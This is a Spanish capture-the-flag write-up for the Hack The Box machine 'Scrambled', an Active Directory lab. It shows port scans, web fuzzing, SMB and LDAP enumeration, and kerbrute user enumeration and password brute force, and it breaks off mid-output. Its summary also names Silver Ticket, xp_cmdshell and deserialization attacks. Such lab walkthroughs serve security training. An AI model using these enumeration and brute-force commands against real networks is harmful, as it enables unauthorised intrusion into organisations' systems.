---
title: "Scrambled - Hack The Box"
date: 2024-10-02
draft: false
slug: "htb-writeup-scrambled"
excerpt: "Esta es una máquina que nos reta a probar varias formas de poder ganar acceso, pues por un ataque que sufrieron, se desactivó la autenticación NTLM, lo que nos complica la forma de explotar la máquina. Primero analizamos la página web, en donde encontramos información útil como la desactivación de la autenticación NTLM, un usuario, etc. Probamos a enumerar varios servicios, pero el que nos ayuda más es el servicio Kerberos. Al probar varias formas de ganar acceso a la máquina vía Kerberos, optamos por aplicar el Silver Ticket Attack con el que ganaremos acceso al servicio MSSQL como el usuario administrador de ese servicio. Gracias a los privilegios que tenemos, es posible que podamos usar el JuicyPotatoNG, pero si quieres ir por el camino difícil, enumeramos las bases de datos existentes, encontrando un usuario y su contraseña en texto claro. Podemos pivotear a otro usuario utilizando un binario netcat, que podemos cargar desde la sesión de MSSQL, siendo que podemos usarlo usando xp_cmdshell. Una vez dentro del otro usuario, lo enumeramos y encontramos un binario que podemos probar en una máquina virtual Windows y analizar usando DNSpy. Dentro del análisis de DNSpy, encontramos que se está ocupando una serialización y deserialización con data que se envía a un servidor desde este binario. Además, encontramos una backdoor que creó un dev, lo que nos da el acceso al login del binario y nos permite crear órdenes. Nos aprovechamos de esto para entender cómo es que se envía data al servidor, siendo que se usan comandos y la data serializada. Gracias a esto, aplicamos un ataque de deserialización, ocupando la herramienta ysoserial para crear una data en el mismo formato que usa el binario de la máquina, esté almacena un comando que usara el binario netcat, que ya tenemos descargado, para mandar y obtener una sesión como el usuario administrador."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Windows", "Active Directory", "SMB", "LDAP", "Kerberos", "MSSQL", "Information Leakage", "Fuzzing", "Kerberos Enumeration", "LDAP Enumeration", "SMB Enumeration", "Password Brute Force", "Kerberoasting Attack", "Cracking Hash", "Silver Ticket Attack", "MSSQL Enumeration", "Enabling xp_cmdshell (RCE)", "User Pivoting", "Binary Analysis", "DLL Analysis", "Analysis with DNSpy", "Deserialization Attack", "Privesc - Deserialization Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "ldapsearch"
  - "kerbrute_linux_amd64"
  - "impacket-smbclient"
  - "exiftool"
  - "impacket-GetUserSPNs"
  - "JohnTheRipper"
  - "impacket-mssqlclient"
  - "impacket-getTGT"
  - "export"
  - "echo"
  - "tr"
  - "impacket-getPac"
  - "impacket-ticketer"
  - "xp_cmdshell"
  - "nc.exe"
  - "curl"
  - "locate"
  - "python3"
  - "rlwrap"
  - "nc"
  - "krb5.conf"
  - "evil-winrm"
  - "mkdir"
  - "script-blocks"
  - "New-Object"
  - "Invoke-Command"
  - "pwsh"
  - "Enter-PSSession"
  - "máquina virtual Windows"
  - "openvpn client"
  - "nc"
  - "dnspy.exe"
  - "ysoserial.exe"
links:
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket"
  - "https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/"
  - "https://learn.microsoft.com/es-es/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16"
  - "https://github.com/Hackplayers/evil-winrm#Remote-path-completion"
  - "https://github.com/jborean93/omi"
  - "https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py"
  - "https://codebeautify.org/ntlm-hash-generator"
  - "https://github.com/antonioCoco/JuicyPotatoNG?tab=readme-ov-file"
  - "https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/"
  - "https://github.com/pwntester/ysoserial.net"
  - "https://github.com/attackdebris/kerberos_enum_userlists"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-scrambled/Scrambled.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.168
PING 10.10.11.168 (10.10.11.168) 56(84) bytes of data.
64 bytes from 10.10.11.168: icmp_seq=1 ttl=127 time=72.8 ms
64 bytes from 10.10.11.168: icmp_seq=2 ttl=127 time=93.5 ms
64 bytes from 10.10.11.168: icmp_seq=3 ttl=127 time=68.7 ms
64 bytes from 10.10.11.168: icmp_seq=4 ttl=127 time=94.1 ms

--- 10.10.11.168 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3010ms
rtt min/avg/max/mdev = 68.697/82.261/94.072/11.596 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.168 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 12:29 CST
Initiating SYN Stealth Scan at 12:29
Scanning 10.10.11.168 [65535 ports]
Discovered open port 135/tcp on 10.10.11.168
Discovered open port 139/tcp on 10.10.11.168
Discovered open port 53/tcp on 10.10.11.168
Discovered open port 80/tcp on 10.10.11.168
Discovered open port 445/tcp on 10.10.11.168
Discovered open port 464/tcp on 10.10.11.168
Discovered open port 49667/tcp on 10.10.11.168
Discovered open port 9389/tcp on 10.10.11.168
Discovered open port 593/tcp on 10.10.11.168
Discovered open port 88/tcp on 10.10.11.168
Discovered open port 49701/tcp on 10.10.11.168
Discovered open port 49673/tcp on 10.10.11.168
Discovered open port 636/tcp on 10.10.11.168
Discovered open port 49674/tcp on 10.10.11.168
Discovered open port 1433/tcp on 10.10.11.168
Discovered open port 58799/tcp on 10.10.11.168
Discovered open port 3269/tcp on 10.10.11.168
Discovered open port 389/tcp on 10.10.11.168
Discovered open port 4411/tcp on 10.10.11.168
Discovered open port 3268/tcp on 10.10.11.168
Discovered open port 5985/tcp on 10.10.11.168
Completed SYN Stealth Scan at 12:30, 54.75s elapsed (65535 total ports)
Nmap scan report for 10.10.11.168
Host is up, received user-set (0.43s latency).
Scanned at 2024-10-01 12:29:27 CST for 54s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
4411/tcp  open  found            syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
58799/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.88 seconds
           Raw packets sent: 262116 (11.533MB) | Rcvd: 58 (2.552KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos demasiados puertos abiertos, entre ellos se ve el **puerto 88** (que es del **servicio Kerberos**), por lo que ya nos damos una idea de a qué nos enfrentamos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49701,58799 10.10.11.168 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 12:31 CST
Nmap scan report for 10.10.11.168
Host is up (0.072s latency).

Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0

|_http-title: Scramble Corp Intranet
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 18:32:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)

|_ssl-date: 2024-10-01T18:35:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2024-10-01T18:35:09+00:00; +1s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM

| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-01T18:28:13
|_Not valid after:  2054-10-01T18:28:13
|_ssl-date: 2024-10-01T18:35:09+00:00; +1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)

|_ssl-date: 2024-10-01T18:35:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)

|_ssl-date: 2024-10-01T18:35:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
4411/tcp  open  found?

| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
58799/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=10/1%Time=66FC4020%P=x86_64-pc-linux-gnu%r
SF:(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Fo
SF:urOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMM
SF:AND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,3
SF:5,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAND
SF:esk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D
SF:,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-01T18:34:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.82 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Está más que claro que nos enfrentamos a un **Directorio Activo (AD)**.

Observa que nos muestra un dominio llamado **scrm.local** y un DNS llamado **dc1.scrm.local**, regístralos en tu **/etc/hosts**.

También veo que está activo el **puerto 80**, por lo que hay una página web que podemos revisar, ahí empezaremos.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura1.png">
</p>

Veamos que nos reporta **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura2.png">
</p>

Está ocupando un **servidor IIS** y es lo único que veo interesante, pero de momento no nos ayuda mucho esta información.

Probemos con **whatweb** para ver si nos reporta algo más:
```bash
whatweb http://10.10.11.168
http://10.10.11.168 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.168], JQuery, Microsoft-IIS[10.0], Script, Title[Scramble Corp Intranet]
```
Nada, analicemos qué nos podemos encontrar en la página web.

Navegando un poco, si vamos a la ruta `/support.html` a la que puedes entrar desde el botón **IT Services**, nos muestra un mensaje importante:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura3.png">
</p>

Resulta que muchas herramientas que ocupamos, necesitan la **autenticación NTLM** para funcionar, por lo que esto nos puede dar problemas contra esta máquina.

Tengamos presente este mensaje de ahora en adelante.

Si vamos a la ruta `/supportrequest.html` a la que puedes entrar desde el botón **Contacting IT Support**, nos explican que al mandar un correo de soporte, debemos incluir los datos de nuestra red y explican cómo hacerlo. Lo curioso, es que podemos ver un usuario llamado **ksimpson**.

Guardemos este usuario para más adelante:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura4.png">
</p>

Por último, si vamos a la ruta `/salesorders.html` a la que puedes entrar desde el botón **Report a problem with the sales orders app**, nos explican como aplicar un troubleshooting con la aplicación que usan en sus sistemas, lo importante aquí es que podemos ver el dominio del **AD** (que ya habíamos visto en el escaneo de servicios) y el puerto en donde está activa la aplicación:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura5.png">
</p>

Hemos encontrado información bastante útil en esta página, solamente apliquemos **Fuzzing** por si hay algo que se nos esté escapando.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.168/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.168/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                     
=====================================================================

000000002:   301        1 L      10 W       150 Ch      "images"                         
000000189:   301        1 L      10 W       150 Ch      "Images"                                                     
000000277:   301        1 L      10 W       150 Ch      "assets"                                                        
000003659:   301        1 L      10 W       150 Ch      "IMAGES"
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.11.168/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.168/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.11.168/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.11.168/Images/]
/assets               (Status: 301) [Size: 150] [--> http://10.10.11.168/assets/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.11.168/IMAGES/]
/Assets               (Status: 301) [Size: 150] [--> http://10.10.11.168/Assets/]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

No encontramos nada más, vamos a enumerar otros servicios.

### Enumeración de Servicio SMB y LDAP {#SMB}

Como ya vimos que la **autenticación NTLM** esta desactivada, probar a enumerar el **servicio SMB** sería inutil, pero algo podremos hacer.

Probemos primero con **crackmapexec**:
```bash
crackmapexec smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)
```
Observa cómo no nos reporta nada del **servicio SMB**, salvo que no usa el **SMBv1** y que está activada la autenticación.

Veamos si podemos listar los archivos compartidos con **smbclient**:
```bash
smbclient -L //10.10.11.168// -N
session setup failed: NT_STATUS_NOT_SUPPORTED
```
Tampoco nos reporta algo y nos da un error sobre el **NTLM**.

Por último, probemos si **smbmap** puede encontrar algo:
```bash
smbmap -H 10.10.11.168
/usr/lib/python3/dist-packages/smbmap/smbmap.py:441: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % remoteName

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 0 connections
```
Nada, no pudimos hacer algo contra el **servicio SMB** con nuestras herramientas principales.

Probemos a enumerar el **servicio LDAP**.

Para esto, usaremos la herramienta **ldapsearch**, lo que buscamos es obtener información del dominio (que ya conocemos):
```bash
ldapsearch -H ldap://10.10.11.168 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#
dn:
namingcontexts: DC=scrm,DC=local
namingcontexts: CN=Configuration,DC=scrm,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
Bien, confirmamos que el dominio es **scrm.local** y también tenemos el DNS **dc1.scrm.local**, que por lo que entiendo, este es el servidor del dominio, ósea, la controladora del dominio.

Vemos si podemos obtener más información del dominio:
```bash
ldapsearch -H ldap://10.10.11.168 -x -b "dc=scrm,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=scrm,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```
Nada.

Lo dejaremos hasta aquí y vamos a enumerar el **servicio Kerberos**.

### Enumeración de Servicio Kerberos {#kerberos}

Vamos a empezar por comprobar si el usuario que encontramos sí existe.

Para esto, usaremos la herramienta **Kerbrute** que ya hemos usado en la **máquina Support**.

Guarda en un archivo de texto el **usuario ksimpson** para que lo podamos usar en la herramienta.

Puedes agregar otros usuarios randoms si lo deseas:
```bash
cat users
ksimpson
test
probando
```

Si no lo has hecho, agrega el dominio que encontramos al **/etc/hosts**:
```bash
nano /etc/hosts
10.10.11.168 scrm.local dc1.scrm.local
```

Usemos **Kerbrute** para la enumeración, recuerda que debemos especificar el ataque (que sería **username**, para enumerar usuarios), la IP con el parámetro **--dc** y el dominio con el parámetro **-d** (usaremos el dominio scrm.local):
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.168 -d scrm.local users
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop

2024/10/01 14:11:26 >  Using KDC(s):
2024/10/01 14:11:26 >   10.10.11.168:88

2024/10/01 14:11:26 >  [+] VALID USERNAME:       ksimpson@scrm.local
2024/10/01 14:11:26 >  Done! Tested 4 usernames (1 valid) in 0.074 seconds
```
Excelente, si existe.

Ahora, probemos qué usuarios podremos obtener.

En la **máquina Support** usamos un wordlists de **SecLists**, pero también existen wordlists específicos para **AD** que puedes encontrar en el siguiente link:
* <a href="https://github.com/attackdebris/kerberos_enum_userlists" target="_blank">Kerberos Username Enumeration – Top 500 Common Usernames</a>

Probemos ese wordlists y veamos qué usuarios podemos encontrar:
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.168 -d scrm.local /opt/kerberos_enum_userlists/A-ZSurnames.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop

2024/10/01 14:17:31 >  Using KDC(s):
2024/10/01 14:17:31 >   10.10.11.168:88

2024/10/01 14:17:32 >  [+] VALID USERNAME:       ASMITH@scrm.local
2024/10/01 14:18:05 >  [+] VALID USERNAME:       JHALL@scrm.local
2024/10/01 14:18:09 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2024/10/01 14:18:11 >  [+] VALID USERNAME:       KHICKS@scrm.local
2024/10/01 14:18:38 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2024/10/01 14:19:08 >  Done! Tested 13000 usernames (5 valid) in 96.713 seconds
```
Muy bien, tenemos 4 usuarios más del que ya conocíamos, cópialos en un archivo de texto en minúsculas.

#### Aplicando Fuerza Bruta con Kerbrute para Encontrar Contraseña Válida {#bruteF}

Si bien sabemos que algunas contraseñas pueden ser usadas en distintos usuarios, también debemos tener en cuenta que los mismos nombres de los usuarios, los pueden usar como contraseña del mismo usuario.

Podemos comprobar si algún nombre de usuario, sirve como contraseña del mismo usuario o de otros utilizando el **ataque bruteuser de Kerbrute**.

Vamos a probarlo con el archivo de los usuarios que ya tenemos:
```bash
cat users
asmith
jhall
ksimpson
khicks
sjenkins
```

Prueba el ataque con cada nombre de usuario:
```bash
./kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users asmith
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
2024/10/01 14:27:56 >  Using KDC(s):
2024/10/01 14:27:56 >   10.10.11.168:88
2024/10/01 14:27:56 >  Done! Tested 5 logins (0 successes) in 0.318 seconds

./kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users jhall
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
2024/10/01 16:08:26 >  Using KDC(s):
2024/10/01 16:08:26 >   10.10.11.168:88
2024/10/01 16:08:27 >  Done! Tested 5 logins (0 successes) in 0.321 seconds

./kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users ksimpson
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
2024/10/01 14:27:39 >  Using KDC(s):
2024/10/01 14:27:39 >   10.10.11.168:88
